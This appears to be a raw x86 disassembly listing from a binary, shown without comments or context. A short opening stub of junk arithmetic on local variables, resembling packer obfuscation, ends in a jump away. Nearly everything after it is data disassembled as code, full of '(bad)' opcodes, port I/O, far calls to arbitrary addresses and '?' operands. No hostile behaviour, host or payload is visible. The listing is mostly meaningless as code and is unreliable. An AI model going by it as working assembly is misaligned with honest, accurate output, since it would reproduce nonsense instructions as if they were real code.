  4079e9:	dec    eax
  4079ea:	add    BYTE PTR [eax-0x15],dh
  4079ed:	shl    esi,1
  4079ef:	xchg   ebp,eax
  4079f0:	or     esp,ecx
  4079f2:	dec    esp
  4079f3:	adc    DWORD PTR [ebx-0x749e4181],esp
  4079f9:	inc    ebp
  4079fa:	hlt    
  4079fb:	mov    ecx,DWORD PTR [ebp-0xc]
  4079fe:	sub    eax,ecx
  407a00:	mov    DWORD PTR [ebp-0xc],eax
  407a03:	or     DWORD PTR [ebp-0xc],0xf89c85f9
  407a0a:	mov    eax,DWORD PTR [ebp-0x1c]
  407a0d:	mov    ecx,DWORD PTR [ebp-0x1c]
  407a10:	sub    eax,ecx
  407a12:	mov    DWORD PTR [ebp-0x1c],eax
  407a15:	or     DWORD PTR [ebp-0x1c],0xf89c85d9
  407a1c:	mov    eax,DWORD PTR [ebp-0x20]
  407a1f:	mov    ecx,DWORD PTR [ebp-0x20]
  407a22:	sub    eax,ecx
  407a24:	mov    DWORD PTR [ebp-0x20],eax
  407a27:	mov    eax,DWORD PTR [ebp-0x2c]
  407a2a:	mov    ecx,DWORD PTR [ebp-0x20]
  407a2d:	mov    esi,0x7510899
  407a32:	xor    eax,esi
  407a34:	mov    edi,0x3272e0
  407a39:	add    eax,edi
  407a3b:	or     eax,ecx
  407a3d:	mov    DWORD PTR [ebp-0x20],eax
  407a40:	mov    eax,DWORD PTR [ebp-0x4]
  407a43:	mov    ecx,DWORD PTR [ebp-0x4]
  407a46:	jmp    0x409df0
  407a4b:	clc    
  407a4c:	mov    dh,0xeb
  407a4e:	cmp    DWORD PTR [ebx+0x707b9c77],0xba37e350
  407a58:	sbb    dl,BYTE PTR [eax+ebp*8-0x5d]
  407a5c:	cmp    al,0x7a
  407a5e:	jp     0x407a45
  407a60:	pop    edi
  407a61:	jp     0x407add
  407a63:	ins    BYTE PTR es:[edi],dx
  407a64:	dec    ebx
  407a65:	jp     0x407a90
  407a67:	fdivr  st,st(7)
  407a69:	loope  0x407a34
  407a6b:	jge    0x407abc
  407a6d:	xlat   BYTE PTR ds:[ebx]
  407a6e:	mov    ss,WORD PTR [edi+0x42]
  407a71:	inc    eax
  407a72:	xchg   esi,eax
  407a73:	sub    eax,0xaf508636
  407a78:	mov    ebx,0x865b594
  407a7d:	push   cs
  407a7e:	mov    ah,0xb9
  407a80:	rcr    DWORD PTR [edx-0x60c6d997],0xe5
  407a87:	add    BYTE PTR [ecx-0x22],0x64
  407a8b:	add    ebx,DWORD PTR [edi+0x18]
  407a8e:	pop    es
  407a8f:	sbb    ecx,DWORD PTR [ecx+0x3b3b334d]
  407a95:	xchg   BYTE PTR [ecx-0x38ee2a54],ah
  407a9b:	(bad)  [edx+0x7a7072cc]
  407aa1:	jp     0x407a6c
  407aa3:	std    
  407aa4:	in     al,dx
  407aa5:	mov    edx,DWORD PTR [edx+0x7e7e60d9]
  407aab:	pop    ecx
  407aac:	sbb    dl,BYTE PTR [edx+ecx*4]
  407aaf:	inc    esi
  407ab0:	push   ebp
  407ab1:	xchg   ecx,eax
  407ab2:	dec    edi
  407ab3:	in     eax,dx
  407ab4:	mov    ah,0x95
  407ab6:	mov    ebx,0x735d3464
  407abb:	loope  0x407b0e
  407abd:	xchg   ebx,eax
  407abe:	sbb    eax,0x6bbdf0
  407ac3:	mov    ebx,0xa3e8d498
  407ac8:	add    bh,BYTE PTR [eax-0x5b0e1086]
  407ace:	jns    0x407a89
  407ad0:	sub    al,0xa1
  407ad2:	inc    ebp
  407ad3:	jg     0x407ac7
  407ad5:	pop    esp
  407ad6:	aad    0xec
  407ad8:	mov    ds:0x153e0c8b,al
  407add:	sbb    BYTE PTR [esi+0x45],cl
  407ae0:	jmp    0x98514dcd
  407ae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ae6:	mov    eax,0x59590306
  407aeb:	pop    ds
  407aec:	inc    esi
  407aed:	call   FWORD PTR [eax]
  407aef:	test   DWORD PTR [eax-0x609f8351],eax
  407af5:	ret    
  407af6:	es aad 0x6b
  407af9:	int3   
  407afa:	scas   al,BYTE PTR es:[edi]
  407afb:	pop    esi
  407afc:	mov    bl,0x68
  407afe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407aff:	outs   dx,BYTE PTR ds:[esi]
  407b00:	or     esp,DWORD PTR [ecx-0x480acdaa]
  407b06:	mov    bh,0xd
  407b08:	in     eax,0x63
  407b0a:	sub    DWORD PTR [edi-0x1a],edx
  407b0d:	lock mov ah,0xb9
  407b10:	shl    eax,0x13
  407b13:	xor    BYTE PTR [edx],al
  407b15:	(bad)  
  407b16:	and    DWORD PTR [edi],ecx
  407b18:	out    dx,eax
  407b19:	sbb    bh,BYTE PTR [ebp+0x7e]
  407b1c:	and    al,0x9d
  407b1e:	lea    esp,[ecx+0x6830fa85]
  407b24:	mov    ebx,0x33cf1783
  407b29:	mov    bh,0x37
  407b2b:	xchg   edx,eax
  407b2c:	lods   eax,DWORD PTR ds:[esi]
  407b2d:	iret   
  407b2e:	pop    esi
  407b2f:	dec    eax
  407b30:	jl     0x407ae9
  407b32:	repz mov al,0x3c
  407b35:	xchg   ebx,eax
  407b36:	pop    edi
  407b37:	cmc    
  407b38:	push   ss
  407b39:	xchg   ebp,eax
  407b3a:	adc    DWORD PTR [edx+0x5c],eax
  407b3d:	pop    ebx
  407b3e:	push   ss
  407b3f:	xchg   ecx,eax
  407b40:	mov    al,ds:0xf02407da
  407b45:	xchg   esp,eax
  407b46:	cmc    
  407b47:	sub    dl,dl
  407b49:	dec    ecx
  407b4a:	jge    0x407b21
  407b4c:	fidivr DWORD PTR [eax-0x12ec4968]
  407b52:	or     DWORD PTR [ecx+0xa],ebp
  407b55:	jnp    0x407b79
  407b57:	jp     0x407b62
  407b59:	outs   dx,BYTE PTR ds:[esi]
  407b5a:	jae    0x407b63
  407b5c:	ss pop ebp
  407b5e:	rol    BYTE PTR [edi+0x6e],cl
  407b61:	sbb    dh,BYTE PTR [edi*4-0xc812c2e]
  407b68:	in     al,dx
  407b69:	and    DWORD PTR [eax+0x2fbd329e],esp
  407b6f:	aad    0xc
  407b71:	mov    WORD PTR [ecx+0x66d9f062],?
  407b77:	mov    bl,0x4d
  407b79:	mov    BYTE PTR [ebp+0x72e622ee],dl
  407b7f:	mov    dl,0xd9
  407b81:	and    ebx,0x64080d24
  407b87:	enter  0x83b5,0x33
  407b8b:	push   ebp
  407b8c:	adc    DWORD PTR [ebx],0x29
  407b8f:	cmp    DWORD PTR [ecx+0x5e20b9ed],ebx
  407b95:	pop    esi
  407b96:	out    0x7b,al
  407b98:	sub    ebp,DWORD PTR [ecx+0x36]
  407b9b:	or     BYTE PTR [eax+0x20673316],dh
  407ba1:	sahf   
  407ba2:	or     al,0x51
  407ba4:	popa   
  407ba5:	int3   
  407ba6:	or     DWORD PTR [ecx+eax*4],0xffffff91
  407baa:	(bad)  
  407bab:	sar    BYTE PTR [edx+esi*4-0xa],cl
  407baf:	pop    eax
  407bb0:	retf   0x15d9
  407bb3:	adc    DWORD PTR [edi+0x36],0xfb5c3a5f
  407bba:	es cmp eax,0xfee7f9f3
  407bc0:	mov    bh,0x51
  407bc2:	mov    ds:0x16802743,al
  407bc7:	ins    DWORD PTR es:[edi],dx
  407bc8:	sub    BYTE PTR [ebx],dl
  407bca:	adc    DWORD PTR [esi],edx
  407bcc:	add    ah,dl
  407bce:	and    eax,0x7c046904
  407bd3:	and    al,0x47
  407bd5:	add    al,0xa9
  407bd7:	int    0xd4
  407bd9:	cmp    eax,0x72e0874a
  407bde:	inc    eax
  407bdf:	out    0x2,eax
  407be1:	cmp    al,0x90
  407be3:	arpl   WORD PTR [ebx+0x282db842],si
  407be9:	loopne 0x407bf4
  407beb:	add    bh,BYTE PTR [edi]
  407bed:	xor    dl,bl
  407bef:	mov    al,ds:0xc1ad6fd5
  407bf4:	cdq    
  407bf5:	pop    eax
  407bf6:	loope  0x407bf7
  407bf8:	jae    0x407bb5
  407bfa:	ins    DWORD PTR es:[edi],dx
  407bfb:	ret    
  407bfc:	sar    DWORD PTR [ecx-0x80],1
  407bff:	or     esi,ecx
  407c01:	pop    eax
  407c02:	sbb    ebp,0x88820b4f
  407c08:	jnp    0x407bc4
  407c0a:	pop    edi
  407c0b:	xchg   ebx,eax
  407c0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c0d:	dec    ebx
  407c0e:	and    eax,0x2cde7e17
  407c13:	inc    edi
  407c14:	push   edx
  407c15:	add    edx,DWORD PTR [edi+0x1aab5788]
  407c1b:	dec    ebp
  407c1c:	inc    ebx
  407c1d:	arpl   cx,dx
  407c1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c20:	push   esp
  407c21:	hlt    
  407c22:	cwde   
  407c23:	cmp    al,0x4d
  407c25:	sahf   
  407c26:	mov    dl,0xee
  407c28:	mov    WORD PTR [ebx],fs
  407c2a:	sbb    al,0x4d
  407c2c:	adc    bh,BYTE PTR [eax-0x3b]
  407c2f:	or     BYTE PTR [ebx-0x4529a207],al
  407c35:	and    eax,0x957a2a9c
  407c3a:	lea    ecx,[ebx]
  407c3c:	xlat   BYTE PTR ds:[ebx]
  407c3d:	pop    ecx
  407c3e:	jp     0x407c91
  407c40:	jno    0x407cb1
  407c42:	ins    DWORD PTR es:[edi],dx
  407c43:	sub    BYTE PTR [ecx],al
  407c45:	rcr    bl,1
  407c47:	mov    ebx,0xf43d9ead
  407c4c:	ss scas eax,DWORD PTR es:[edi]
  407c4e:	dec    ecx
  407c4f:	in     eax,dx
  407c50:	adc    al,0xf7
  407c52:	fidiv  WORD PTR ds:0xe52470d3
  407c58:	and    al,0x39
  407c5a:	imul   DWORD PTR [edi+0x3ca984b8]
  407c60:	sub    ecx,ebx
  407c62:	pop    edi
  407c63:	xchg   edi,eax
  407c64:	push   ebx
  407c65:	int3   
  407c66:	(bad)  
  407c67:	fild   DWORD PTR [ebp-0x49]
  407c6a:	cmp    al,BYTE PTR [esi+0x68]
  407c6d:	xchg   edi,eax
  407c6e:	scas   al,BYTE PTR es:[edi]
  407c6f:	imul   eax,DWORD PTR [edx-0x70],0xffffff87
  407c73:	adc    esp,esi
  407c75:	inc    ebx
  407c76:	cmp    al,0xdb
  407c78:	lds    ebx,FWORD PTR [esi-0x6112bb5]
  407c7e:	dec    edi
  407c7f:	dec    ebp
  407c80:	scas   eax,DWORD PTR es:[edi]
  407c81:	out    0x1e,eax
  407c83:	stc    
  407c84:	fbld   TBYTE PTR [eax]
  407c86:	xlat   BYTE PTR ds:[ebx]
  407c87:	sub    ebx,eax
  407c89:	and    eax,0x8760d5a7
  407c8e:	outs   dx,DWORD PTR ds:[esi]
  407c8f:	xor    DWORD PTR [eax+0x59],ebp
  407c92:	jbe    0x407c1c
  407c94:	fist   WORD PTR [esp+0x237911b1]
  407c9b:	dec    edx
  407c9c:	jge    0x407c8e
  407c9e:	jbe    0x407c71
  407ca0:	shl    BYTE PTR [ecx-0x2a0d0de7],1
  407ca6:	call   0xea3b:0x63ba0fcc
  407cad:	jns    0x407c53
  407caf:	push   ds
  407cb0:	xchg   ebp,eax
  407cb1:	and    dl,0x18
  407cb4:	push   ecx
  407cb5:	inc    ecx
  407cb6:	aad    0x37
  407cb8:	inc    esp
  407cb9:	gs pop ss
  407cbb:	cmp    DWORD PTR [ecx+0x5a88d8be],ebx
  407cc1:	mov    dl,0xfa
  407cc3:	mov    ds:0x1ec186e8,al
  407cc8:	mov    bh,0xeb
  407cca:	inc    ebp
  407ccb:	lds    eax,FWORD PTR [esi+eiz*8-0x62]
  407ccf:	push   esp
  407cd0:	inc    ebx
  407cd1:	daa    
  407cd2:	xor    al,0x4d
  407cd4:	sub    ebx,esi
  407cd6:	sbb    ah,BYTE PTR [ecx]
  407cd8:	pop    edi
  407cd9:	fsub   st,st(7)
  407cdb:	in     al,0xb0
  407cdd:	pop    ebx
  407cde:	stos   DWORD PTR es:[edi],eax
  407cdf:	mov    ds:0x5abb6111,eax
  407ce4:	mov    dl,0xd9
  407ce6:	(bad)  
  407ce7:	aam    0xb9
  407ce9:	enter  0x98f3,0x30
  407ced:	push   0xf035e78d
  407cf2:	test   ch,dl
  407cf4:	jb     0x407ce3
  407cf6:	mov    eax,ds:0xf88467b0
  407cfb:	popf   
  407cfc:	aam    0x13
  407cfe:	into   
  407cff:	adc    DWORD PTR [ecx+0x775db7c0],ebp
  407d05:	mov    edi,0xf573d1ac
  407d0a:	pop    es
  407d0b:	adc    ebp,DWORD PTR [esi+0x5b]
  407d0e:	dec    ebp
  407d0f:	in     eax,0x7
  407d11:	aad    0x2
  407d13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d14:	(bad)  
  407d15:	ins    DWORD PTR es:[edi],dx
  407d16:	(bad)
  407d19:	jecxz  0x407d48
  407d1b:	mov    ds:0x59bce6c6,eax
  407d20:	xchg   edi,eax
  407d21:	ficomp DWORD PTR [esi-0xe]
  407d24:	fucomp st(6)
  407d26:	add    ebp,ebp
  407d28:	repnz stos DWORD PTR es:[edi],eax
  407d2a:	dec    ecx
  407d2b:	idiv   DWORD PTR [edx]
  407d2d:	or     al,0xd2
  407d2f:	mov    ah,0x52
  407d31:	loop   0x407d66
  407d33:	pop    es
  407d34:	test   al,0x1
  407d36:	xchg   edx,eax
  407d37:	sub    al,0xab
  407d39:	scas   eax,DWORD PTR es:[edi]
  407d3a:	adc    dl,bh
  407d3c:	mov    edx,0xb03297cc
  407d41:	sub    edi,esi
  407d43:	retf   
  407d44:	lods   eax,DWORD PTR ds:[esi]
  407d45:	inc    ecx
  407d46:	xchg   ebp,eax
  407d47:	jl     0x407d78
  407d49:	idiv   BYTE PTR [ebp+0x7fdd6a79]
  407d4f:	(bad)  
  407d50:	fcmovu st,st(5)
  407d52:	xor    al,0x39
  407d54:	jb     0x407ce6
  407d56:	sub    bl,BYTE PTR [ecx-0xefd6c3d]
  407d5c:	and    ecx,DWORD PTR [ebx]
  407d5e:	inc    DWORD PTR [eax]
  407d60:	inc    ebp
  407d61:	nop
  407d62:	inc    esp
  407d63:	xchg   edx,eax
  407d64:	sub    eax,0xfa713713
  407d69:	push   cs
  407d6a:	xlat   BYTE PTR ds:[ebx]
  407d6b:	add    DWORD PTR [esi*8+0x30ecdf26],ecx
  407d72:	mov    ds:0x91a41d7e,eax
  407d77:	in     eax,dx
  407d78:	mov    bl,0x5d
  407d7a:	xor    BYTE PTR [esp+esi*2-0x52],cl
  407d7e:	jo     0x407d5e
  407d80:	fs sahf 
  407d82:	xor    al,0x85
  407d84:	xchg   ebp,eax
  407d85:	pop    edi
  407d86:	lds    esi,FWORD PTR [ebp-0x39]
  407d89:	clc    
  407d8a:	lods   al,BYTE PTR ds:[esi]
  407d8b:	adc    al,0xfe
  407d8d:	mov    ch,0x1
  407d8f:	(bad)  
  407d90:	(bad)  
  407d91:	mov    DWORD PTR [ecx],ebp
  407d93:	cmp    DWORD PTR [edi+0x5c],edi
  407d96:	mov    al,ds:0xca950d3a
  407d9b:	jo     0x407d56
  407d9d:	ins    DWORD PTR es:[edi],dx
  407d9e:	pop    es
  407d9f:	stos   BYTE PTR es:[edi],al
  407da0:	and    DWORD PTR [edx],edi
  407da2:	rol    DWORD PTR [edx],1
  407da4:	xchg   esi,eax
  407da5:	xchg   edx,eax
  407da6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407da7:	punpcklbw mm3,DWORD PTR [edx+0x1b]
  407dab:	test   BYTE PTR [ebx+0x3],bh
  407dae:	pop    ebx
  407daf:	(bad)  
  407db0:	ins    DWORD PTR es:[edi],dx
  407db1:	shl    BYTE PTR [esi+0x6b4bfcfe],1
  407db7:	test   DWORD PTR [ebx-0x5],0x9dc5844
  407dbe:	lahf   
  407dbf:	lea    esp,[ebx]
  407dc1:	aam    0x7c
  407dc3:	stos   DWORD PTR es:[edi],eax
  407dc4:	addr16 push 0x6
  407dc7:	clc    
  407dc8:	mov    dh,0x2
  407dca:	pop    edx
  407dcb:	cld    
  407dcc:	loop   0x407e0e
  407dce:	jle    0x407d82
  407dd0:	jno    0x407e1e
  407dd2:	(bad)  
  407dd4:	out    0x6,eax
  407dd6:	sub    DWORD PTR [esi-0xe],0xa8dedb6c
  407ddd:	or     edx,edx
  407ddf:	stos   BYTE PTR es:[edi],al
  407de0:	or     eax,0x34997ba5
  407de5:	push   0x2c431112
  407dea:	mov    edi,DWORD PTR [eax+ebp*8]
  407ded:	xchg   DWORD PTR cs:[ebx+0x50],ecx
  407df1:	jle    0x407dc8
  407df3:	sbb    esp,DWORD PTR [esi+0x777ac6b8]
  407df9:	hlt    
  407dfa:	push   0x73
  407dfc:	lds    ecx,FWORD PTR [ebx+0x3777cde4]
  407e02:	aad    0xe7
  407e04:	aam    0xd
  407e06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e07:	and    BYTE PTR [esi+0x44e7d1e6],0x3b
  407e0e:	dec    edx
  407e0f:	test   esi,0xa4368e56
  407e15:	test   al,0x1d
  407e17:	dec    ebx
  407e18:	ror    al,1
  407e1a:	jge    0x407e2a
  407e1c:	test   al,0x83
  407e1e:	mov    bh,0x7c
  407e20:	jno    0x407df6
  407e22:	jmp    0x407e5f
  407e24:	inc    ecx
  407e25:	in     eax,0x8d
  407e27:	or     al,BYTE PTR ds:[edi-0xf]
  407e2b:	cmp    ch,bh
  407e2d:	xchg   ebp,eax
  407e2e:	adc    bh,dh
  407e30:	out    0x43,al
  407e32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e33:	icebp  
  407e34:	pop    ds
  407e35:	fadd   DWORD PTR [eax-0x4e]
  407e38:	fist   DWORD PTR ds:[esi-0x64158ec0]
  407e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e40:	xchg   esi,eax
  407e41:	jae    0x407e7f
  407e43:	jbe    0x407dd7
  407e45:	pop    ss
  407e46:	lods   eax,DWORD PTR ds:[esi]
  407e47:	pop    esi
  407e48:	outs   dx,BYTE PTR ds:[esi]
  407e49:	cmp    dl,dl
  407e4b:	mov    ds:0x5afa4d51,eax
  407e50:	inc    ecx
  407e51:	aaa    
  407e52:	inc    ecx
  407e53:	mov    al,0x4a
  407e55:	aad    0xf5
  407e57:	popa   
  407e58:	xor    eax,0x22488f37
  407e5d:	dec    esi
  407e5e:	mov    ecx,0x61bb3688
  407e63:	(bad)  
  407e64:	cwde   
  407e65:	sub    cl,dl
  407e67:	xor    ah,al
  407e69:	lods   eax,DWORD PTR ds:[esi]
  407e6a:	dec    esp
  407e6b:	pop    ss
  407e6c:	les    esi,FWORD PTR [ebx]
  407e6e:	jg     0x407e3d
  407e70:	sub    eax,0xada65372
  407e75:	div    BYTE PTR [ebx-0x1d]
  407e78:	outs   dx,BYTE PTR ds:[esi]
  407e79:	retf   0xb5cc
  407e7c:	push   esp
  407e7d:	dec    edi
  407e7e:	sbb    edx,DWORD PTR [esi+0x4e]
  407e81:	stos   BYTE PTR es:[edi],al
  407e82:	push   0x13
  407e84:	fcmovnb st,st(6)
  407e86:	ins    BYTE PTR es:[edi],dx
  407e87:	ins    DWORD PTR es:[edi],dx
  407e88:	mov    ebx,0xc6aed771
  407e8d:	mov    edi,0xbd42a6b3
  407e92:	xor    BYTE PTR [ebx-0x108c2faa],dl
  407e98:	jecxz  0x407ec7
  407e9a:	inc    ebp
  407e9b:	jnp    0x407eb6
  407e9d:	inc    ebp
  407e9e:	aas    
  407e9f:	je     0x407e5b
  407ea1:	pop    ebx
  407ea2:	xor    ebp,eax
  407ea4:	xor    ecx,DWORD PTR [esi+ecx*1-0x34]
  407ea8:	repz lds esi,FWORD PTR [ebx-0x4b]
  407eac:	add    edx,ebx
  407eae:	mov    esi,0x71e6c53d
  407eb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eb4:	push   0x3e1b5d13
  407eb9:	ins    BYTE PTR es:[edi],dx
  407eba:	ss dec ebp
  407ebc:	sahf   
  407ebd:	mov    ds:0xbf297111,al
  407ec2:	jns    0x407e8f
  407ec4:	or     eax,0xd7ce0f
  407ec9:	enter  0x486c,0x70
  407ecd:	aas    
  407ece:	daa    
  407ecf:	rol    DWORD PTR [ebx+0x237c3ca0],0x35
  407ed6:	cdq    
  407ed7:	arpl   si,cx
  407ed9:	pop    esp
  407eda:	push   edx
  407edb:	jmp    0x446:0x7162e1ca
  407ee2:	pushf  
  407ee3:	pop    esi
  407ee4:	jle    0x407e90
  407ee6:	cmp    al,BYTE PTR [edi]
  407ee8:	pop    edi
  407ee9:	(bad)  
  407eeb:	mov    bh,0xe5
  407eed:	mov    al,ds:0xb9e60427
  407ef2:	call   0x850595a3
  407ef7:	out    0xe8,eax
  407ef9:	mov    ah,0x48
  407efb:	pusha  
  407efc:	sub    al,0x7f
  407efe:	push   cs
  407eff:	dec    eax
  407f00:	(bad)  
  407f01:	xchg   DWORD PTR [ebx+edx*8-0x14],eax
  407f05:	in     al,dx
  407f06:	std    
  407f07:	push   0x1d
  407f09:	sar    DWORD PTR [ecx],1
  407f0b:	xor    eax,DWORD PTR [esi+0x17]
  407f0e:	sub    BYTE PTR [esi+0x57],0xee
  407f12:	mov    ah,0x74
  407f14:	mov    bh,BYTE PTR [edx-0x1b]
  407f17:	or     BYTE PTR [esi],bh
  407f19:	inc    ebp
  407f1a:	sbb    al,0xaf
  407f1c:	add    BYTE PTR [ecx],al
  407f1e:	repnz mov eax,0xf2ff3162
  407f24:	jl     0x407f8d
  407f26:	jmp    0x407ee6
  407f28:	xor    ebx,DWORD PTR [edi]
  407f2a:	jg     0x407f8f
  407f2c:	and    DWORD PTR ss:[ebx-0x4382ed8d],esp
  407f33:	aaa    
  407f34:	out    0x7b,eax
  407f36:	(bad)  
  407f37:	in     al,0x52
  407f39:	mov    ebx,DWORD PTR [eax]
  407f3b:	xlat   BYTE PTR ds:[ebx]
  407f3c:	xchg   esp,eax
  407f3d:	ret    
  407f3e:	nop
  407f3f:	loope  0x407fb0
  407f41:	and    BYTE PTR [eax+0x1a858cbd],0xd3
  407f48:	(bad)  
  407f49:	shl    BYTE PTR [ecx],1
  407f4b:	cmp    BYTE PTR [ecx-0x55],bl
  407f4e:	mov    edi,0x527e6e11
  407f53:	pop    ss
  407f54:	int    0x3b
  407f56:	jnp    0x407fc2
  407f58:	aaa    
  407f59:	jnp    0x407f85
  407f5b:	mov    cl,0xbe
  407f5d:	out    0xcb,al
  407f5f:	clc    
  407f60:	leave  
  407f61:	jmp    0x94e05cc7
  407f66:	call   0x66a9:0x2f5133a7
  407f6d:	inc    esi
  407f6e:	sahf   
  407f6f:	popf   
  407f70:	or     BYTE PTR [ecx],al
  407f72:	inc    esi
  407f73:	sub    DWORD PTR [esi],esp
  407f75:	and    ah,BYTE PTR [ebx+ebx*8]
  407f78:	xor    eax,0x3bf9a5b2
  407f7d:	frstor [esi+0x4674774e]
  407f83:	jmp    0x5e162fe1
  407f88:	mov    ds:0x6705a943,eax
  407f8d:	dec    eax
  407f8e:	cld    
  407f8f:	enter  0xab80,0x5a
  407f93:	aaa    
  407f94:	xchg   ebp,eax
  407f95:	jp     0x407f9a
  407f97:	(bad)  [esi+ebp*4+0x772ad92d]
  407f9e:	jmp    0x407fe2
  407fa0:	jl     0x407f58
  407fa2:	or     BYTE PTR [esp+eiz*8],bh
  407fa5:	nop
  407fa6:	push   0xffffffeb
  407fa8:	out    0xdd,eax
  407faa:	mov    edx,0xccf78152
  407faf:	cmp    eax,DWORD PTR [ecx+ebp*2-0x68]
  407fb3:	mov    eax,ds:0x7380fc9a
  407fb8:	mov    ebx,0x742ac09f
  407fbd:	pop    ebp
  407fbe:	mov    edi,0x66d9292
  407fc3:	ret    0x604d
  407fc6:	pop    eax
  407fc7:	and    ecx,DWORD PTR [edx]
  407fc9:	cmp    BYTE PTR [edi+ebx*2+0x2eb66c2d],0x51
  407fd1:	stos   BYTE PTR es:[edi],al
  407fd2:	(bad)  
  407fd3:	dec    ebx
  407fd4:	int    0x21
  407fd6:	adc    BYTE PTR [edi+edx*8+0x4a],0x91
  407fdb:	xor    al,0x82
  407fdd:	jecxz  0x408038
  407fdf:	sub    dh,0xa4
  407fe2:	pushf  
  407fe3:	cwde   
  407fe4:	fnstenv [ebx-0x1d6fde5f]
  407fea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407feb:	(bad)  
  407fec:	clc    
  407fed:	repnz mov edi,0xb93a635e
  407ff3:	iret   
  407ff4:	daa    
  407ff5:	xchg   BYTE PTR [eax-0x4a],al
  407ff8:	jbe    0x407fc4
  407ffa:	mov    al,ds:0xcfa08260
  407fff:	push   cs
  408000:	sti    
  408001:	out    0x1b,eax
  408003:	cld    
  408004:	add    eax,0x5942a873
  408009:	sbb    bl,BYTE PTR [eax-0x2]
  40800c:	jp     0x40806c
  40800e:	sbb    BYTE PTR [ebx],dh
  408010:	fwait
  408011:	pushf  
  408012:	pop    ecx
  408013:	jb     0x408073
  408015:	fimul  DWORD PTR [ecx+esi*8-0x4431dd04]
  40801c:	icebp  
  40801d:	cdq    
  40801e:	push   cs
  40801f:	mov    ah,0x25
  408021:	stos   DWORD PTR es:[edi],eax
  408022:	and    eax,0xf30fbd3f
  408027:	(bad)  
  408029:	mov    edx,DWORD PTR [esi+0x3d]
  40802c:	fs in  al,0xbb
  40802f:	out    0x8c,al
  408031:	push   edi
  408032:	mov    ch,0x4c
  408034:	shufps xmm1,xmm0,0xc2
  408038:	cvtdq2ps xmm2,xmm4
  40803b:	jmp    0x408035
  40803d:	test   DWORD PTR [eax-0x6],edx
  408040:	lahf   
  408041:	jl     0x408034
  408043:	dec    esi
  408044:	inc    ebx
  408045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408046:	xor    al,0x17
  408048:	add    ah,BYTE PTR [eax]
  40804a:	xchg   edi,eax
  40804b:	pop    eax
  40804c:	push   0x16cdbbb4
  408051:	ret    
  408052:	repz loop 0x407fe2
  408055:	jecxz  0x408043
  408057:	in     eax,0x63
  408059:	inc    esi
  40805a:	pop    ss
  40805b:	imul   ebp,edx,0xffffff95
  40805e:	jg     0x4080bf
  408060:	test   DWORD PTR [edx+esi*2-0x47],0x77420869
  408068:	ret    0x95bd
  40806b:	mov    ds:0xa6119f67,al
  408070:	add    al,0xb4
  408072:	fnstenv es:[ebx-0x53f01ca7]
  408079:	test   DWORD PTR [ebx+0x12],ebp
  40807c:	loope  0x40802b
  40807e:	popf   
  40807f:	sbb    bh,BYTE PTR [edi]
  408081:	mov    ds:0xf4b0cb74,eax
  408086:	(bad)  
  408087:	mov    eax,0x717d88dd
  40808c:	dec    ecx
  40808d:	outs   dx,DWORD PTR ds:[esi]
  40808e:	sbb    al,0xe9
  408090:	retf   0x6e55
  408093:	mov    dh,0xfb
  408095:	push   ss
  408096:	cdq    
  408097:	sbb    eax,0x2fa92949
  40809c:	or     eax,0x39a59fe9
  4080a1:	add    eax,DWORD PTR [eax-0x32]
  4080a4:	inc    eax
  4080a6:	cmp    eax,0x4079c6e4
  4080ab:	mov    eax,0xc5caa58d
  4080b0:	cmp    ecx,eax
  4080b2:	pop    esp
  4080b3:	aad    0x59
  4080b5:	imul   edx,DWORD PTR [ebx-0xa915dce],0xffffffc0
  4080bc:	mov    eax,0xc1f9f4b7
  4080c1:	xor    al,0x38
  4080c3:	mov    edx,0x1bb58f6f
  4080c8:	loope  0x408108
  4080ca:	pop    ds
  4080cb:	pop    eax
  4080cc:	adc    al,cl
  4080ce:	mov    ?,eax
  4080d0:	ror    DWORD PTR [edx+0x43],cl
  4080d3:	fild   DWORD PTR [esi]
  4080d5:	jne    0x4080b4
  4080d7:	xlat   BYTE PTR ds:[ebx]
  4080d8:	sub    edx,DWORD PTR [esi-0x989e84b]
  4080de:	retf   
  4080df:	ds fs push ebp
  4080e2:	push   cs
  4080e3:	add    DWORD PTR [edi],ecx
  4080e5:	shl    esi,0xa9
  4080e8:	and    al,0xe2
  4080ea:	sti    
  4080eb:	push   ebp
  4080ec:	pop    edx
  4080ed:	ins    BYTE PTR es:[edi],dx
  4080ee:	sbb    bl,al
  4080f0:	xor    BYTE PTR [edx+edi*2-0x767ebb0d],al
  4080f7:	push   ebx
  4080f8:	sbb    BYTE PTR [edi-0x3f],cl
  4080fb:	xchg   DWORD PTR [ecx],edx
  4080fd:	jnp    0x4080cf
  4080ff:	mov    esi,0x7c478fb4
  408104:	ficom  WORD PTR [edi]
  408106:	enter  0x81f8,0xe7
  40810a:	into   
  40810b:	mov    ecx,0x9a3faae
  408110:	sbb    eax,esi
  408112:	test   al,0x8
  408114:	pop    ss
  408115:	fist   WORD PTR [ebx+0x25]
  408118:	out    dx,al
  408119:	jae    0x4080a8
  40811b:	pop    esp
  40811c:	or     eax,0x164d23a9
  408121:	out    dx,al
  408122:	and    al,0xd0
  408124:	sub    bh,BYTE PTR [esi+edx*4]
  408127:	sub    BYTE PTR [ebx+0x33822a9b],dl
  40812d:	mov    ch,0x9a
  40812f:	call   0xc627e054
  408134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408135:	lahf   
  408136:	test   al,0x2a
  408138:	or     ebp,DWORD PTR [ebx+0x1aa11f68]
  40813e:	call   0x7931f307
  408143:	push   eax
  408144:	jo     0x408115
  408146:	xchg   ebx,eax
  408147:	jae    0x4081b1
  408149:	pop    ss
  40814a:	and    eax,0xe15e025d
  40814f:	push   eax
  408150:	push   ds
  408151:	cdq    
  408152:	pusha  
  408153:	sub    eax,0xceeabd60
  408158:	call   0x5fa82cfb
  40815d:	aam    0x48
  40815f:	ins    BYTE PTR es:[edi],dx
  408160:	loopne 0x40817f
  408162:	jg     0x4080f6
  408164:	(bad)  
